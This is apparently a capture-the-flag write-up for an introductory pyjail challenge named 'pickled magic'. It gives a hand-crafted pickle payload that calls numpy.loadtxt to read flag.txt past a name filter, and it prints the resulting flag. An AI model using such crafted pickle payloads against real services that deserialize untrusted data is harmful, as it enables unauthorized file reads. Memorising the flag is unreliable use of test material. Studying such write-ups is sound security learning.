# pickled magic

Solved by: @vicevirus

- Category: pyjail,pickle,introductory

### Solution:

1. To know which NumPy module does not contain __ in their name (numpy.loadtxt)
2. Create payload accordingly to get the flag

Payload: 
```
payload = (
    b'cnumpy\n'            
    b'loadtxt\n'           
    b'(Vflag.txt\n'        
    b'Vstr\n'             
    b't'                    
    b'R'                   
    b'.'                   
)

payload_hex = payload.hex()
print(payload_hex)
```
3. Submit the hex value of the pickle to retrieve flag

Flag: `jail{idk_about_mag1c_but_this_is_definitely_pickled}`

